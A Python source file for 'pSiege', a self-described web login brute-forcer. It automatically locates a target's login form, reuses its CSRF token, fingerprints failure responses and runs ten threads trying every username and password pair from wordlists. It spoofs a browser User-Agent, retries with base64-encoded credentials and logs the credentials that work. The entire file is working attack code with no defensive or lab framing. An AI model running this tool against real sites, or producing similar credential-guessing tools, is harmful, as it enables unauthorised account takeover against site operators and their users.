import requests
from bs4 import BeautifulSoup
import re
import sys
import concurrent.futures
import logging
from urllib.parse import urljoin, urlencode
import argparse
import base64
import threading

class PSiege:
    def __init__(self, url, verbose=False):
        self.url = url
        self.verbose = verbose
        self.success_indicators = ["dashboard", "logout", "welcome", "profile", "account", "settings", "home", "main"]
        self.failure_indicators = ["incorrect", "invalid", "fail", "error", "try again", "unsuccessful"]
        self.initialize_session()
        logging.basicConfig(filename='psiege.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    def initialize_session(self):
        # No longer using a shared session across threads
        self.form_data_template = {}
        self.method = 'GET'
        self.action = ''
        self.csrf_token_name = None
        self.csrf_token_value = None
        self.data_type = 'form-data'
        self.failure_indicator = None

    def fetch_page(self):
        try:
            if self.verbose:
                print("Fetching the page...")
            response = requests.get(self.url)
            response.raise_for_status()

            # Handle JavaScript redirects if present
            if 'window.top.location.href' in response.text:
                redirect_url = re.search(r"window\.top\.location\.href='([^']+)'", response.text)
                if redirect_url:
                    redirect_url = redirect_url.group(1)
                    if not redirect_url.startswith('http'):
                        redirect_url = urljoin(response.url, redirect_url)
                    if self.verbose:
                        print(f"Redirecting to {redirect_url}")
                    response = requests.get(redirect_url)
                    response.raise_for_status()

            if self.verbose:
                print("Fetched HTML Content:")
                print(response.text[:1000])
            self.soup = BeautifulSoup(response.content, 'lxml')
            return True
        except requests.exceptions.RequestException as e:
            print(f"Failed to fetch page. Error: {e}")
            return False

    def analyze_form(self):
        forms = self.soup.find_all('form')
        if not forms:
            print("No form found on the page.")
            return False

        # Attempt to find a login form
        for form in forms:
            inputs = form.find_all('input')
            input_names = [input_tag.get('name', '').lower() for input_tag in inputs]
            if any(name in input_names for name in ['username', 'user', 'email', 'password', 'pass']):
                self.method = form.get('method', 'GET').upper()
                action = form.get('action', '')
                self.action = urljoin(self.url, action) if action else self.url
                self.form_data_template = {}

                for input_tag in inputs:
                    name = input_tag.get('name')
                    if not name:
                        continue
                    input_type = input_tag.get('type', 'text').lower()
                    value = input_tag.get('value', '')
                    if input_type == 'hidden':
                        self.form_data_template[name] = value
                        if 'csrf' in name.lower():
                            self.csrf_token_name = name
                            self.csrf_token_value = value
                    elif input_type in ['text', 'email', 'password']:
                        self.form_data_template[name] = ''

                if self.form_data_template:
                    if self.verbose:
                        print("Analyzed form data:")
                        print(f"Method: {self.method}")
                        print(f"Action: {self.action}")
                        print("Form fields:")
                        for key in self.form_data_template.keys():
                            print(f"- {key}")
                    return True

        print("No suitable login form found.")
        return False

    def determine_data_type(self):
        # Simplified: Assume form-data unless JSON is detected
        if self.soup.find('form', attrs={'enctype': 'application/json'}):
            self.data_type = 'json'
        else:
            self.data_type = 'form-data'
        if self.verbose:
            print(f"Determined data type: {self.data_type}")

    def submit_form(self, session, form_data):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36',
                'Referer': self.url
            }

            if self.data_type == 'json':
                headers['Content-Type'] = 'application/json'
            else:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'

            if self.verbose:
                print(f"Submitting form to {self.action} with data:")
                for key, value in form_data.items():
                    print(f"{key}: {value}")

            if self.method == 'POST':
                if self.data_type == 'json':
                    response = session.post(self.action, json=form_data, headers=headers)
                else:
                    response = session.post(self.action, data=form_data, headers=headers)
            else:
                response = session.get(self.action, params=form_data, headers=headers)

            if self.verbose:
                print("Received response:")
                print(f"Status Code: {response.status_code}")
                print(response.text[:1000])

            return response
        except requests.exceptions.RequestException as e:
            print(f"Failed to submit form. Error: {e}")
            return None

    def probe_failure_indicator(self):
        if self.verbose:
            print("Probing for failure indicators with known bad credentials...")
        session = requests.Session()
        form_data = self.form_data_template.copy()
        # Replace username and password fields with invalid credentials
        for key in form_data.keys():
            if 'user' in key.lower():
                form_data[key] = 'invalid_user'
            elif 'pass' in key.lower():
                form_data[key] = 'invalid_pass'

        response = self.submit_form(session, form_data)
        if response:
            self.failure_indicator = response.text
            if self.verbose:
                print("Captured failure indicator.")
        else:
            print("Failed to capture failure indicator.")

    def analyze_response(self, response):
        if not response:
            return False

        if response.status_code >= 400:
            if self.verbose:
                print(f"Received HTTP {response.status_code}, indicating failure.")
            return False

        # Check if redirected back to login page
        if response.url == self.url or 'login' in response.url.lower():
            if self.verbose:
                print("Detected redirection to login page, indicating failure.")
            return False

        response_lower = response.text.lower()

        for indicator in self.success_indicators:
            if indicator in response_lower:
                if self.verbose:
                    print(f"Detected success indicator: {indicator}")
                return True

        for indicator in self.failure_indicators:
            if indicator in response_lower:
                if self.verbose:
                    print(f"Detected failure indicator: {indicator}")
                return False

        if self.failure_indicator and self.failure_indicator.strip() == response.text.strip():
            if self.verbose:
                print("Response matches failure indicator.")
            return False

        if self.verbose:
            print("No clear indicators found. Assuming failure.")
        return False

    def brute_force(self, usernames, passwords, encode_base64=False):
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_creds = {}
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self.attempt_login, username, password, encode_base64)
                    future_to_creds[future] = (username, password)

            for future in concurrent.futures.as_completed(future_to_creds):
                username, password = future_to_creds[future]
                try:
                    success = future.result()
                    if success:
                        print(f"Success with {username}:{password}")
                        logging.info(f"Success with {username}:{password}")
                        return True
                except Exception as e:
                    print(f"Error occurred with {username}:{password}. Error: {e}")
                    logging.error(f"Error with {username}:{password}. Error: {e}")
        return False

    def attempt_login(self, username, password, encode_base64):
        if self.verbose:
            print(f"Trying {username}:{password}")

        session = requests.Session()
        form_data = self.form_data_template.copy()

        # Populate form data with credentials
        for key in form_data.keys():
            if 'user' in key.lower():
                form_data[key] = base64.b64encode(username.encode()).decode() if encode_base64 else username
            elif 'pass' in key.lower():
                form_data[key] = base64.b64encode(password.encode()).decode() if encode_base64 else password

        # Include CSRF token if present
        if self.csrf_token_name and self.csrf_token_value:
            form_data[self.csrf_token_name] = self.csrf_token_value

        response = self.submit_form(session, form_data)
        if response and self.analyze_response(response):
            return True
        return False

    def run_auto(self, usernames, passwords):
        if self.fetch_page() and self.analyze_form():
            self.determine_data_type()
            self.probe_failure_indicator()
            success = self.brute_force(usernames, passwords)
            if not success:
                if self.verbose:
                    print("Retrying with base64 encoded credentials...")
                self.brute_force(usernames, passwords, encode_base64=True)
        else:
            print("Failed to prepare for brute-force attack.")
        self.initialize_session()

def main():
    parser = argparse.ArgumentParser(description='pSiege: Web login brute-forcer.')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-aa', action='store_true', help='Automatically analyze and brute-force using provided credentials')
    parser.add_argument('-u', help='Single username')
    parser.add_argument('-p', help='Single password')
    parser.add_argument('-U', help='Path to usernames list')
    parser.add_argument('-P', help='Path to passwords list')
    parser.add_argument('-vv', action='store_true', help='Enable verbose output')

    args = parser.parse_args()
    psiege = PSiege(args.url, args.vv)

    usernames = []
    passwords = []

    if args.u:
        usernames.append(args.u)
    if args.p:
        passwords.append(args.p)
    if args.U:
        try:
            with open(args.U) as uf:
                usernames.extend([line.strip() for line in uf if line.strip()])
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            return
    if args.P:
        try:
            with open(args.P) as pf:
                passwords.extend([line.strip() for line in pf if line.strip()])
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            return

    if not usernames or not passwords:
        print("You must provide at least one username and one password using -u, -p, -U, or -P.")
        return

    if args.aa:
        psiege.run_auto(usernames, passwords)
    else:
        psiege.brute_force(usernames, passwords)

if __name__ == "__main__":
    main()
